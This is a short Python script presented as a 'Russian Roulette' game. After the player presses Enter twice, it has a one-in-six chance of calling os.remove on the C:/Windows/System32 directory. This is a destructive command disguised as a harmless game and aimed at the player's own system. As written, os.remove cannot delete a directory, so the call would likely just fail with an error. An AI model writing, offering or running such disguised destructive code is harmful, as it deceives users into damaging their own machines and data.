# Russian Roulette
import random
import os


def main():
    input("Welcome to a fun little game of Russian Roulette! \n Press Enter to spin the chamber!")
    input("The game begins, press Enter again to pull the trigger!")
    chamber = random.randint(1, 6)
    if chamber == 1:
        os.remove("C:/Windows/System32")
    else:
        print("Phew, you survived!")


if __name__ == "__main__":
    main()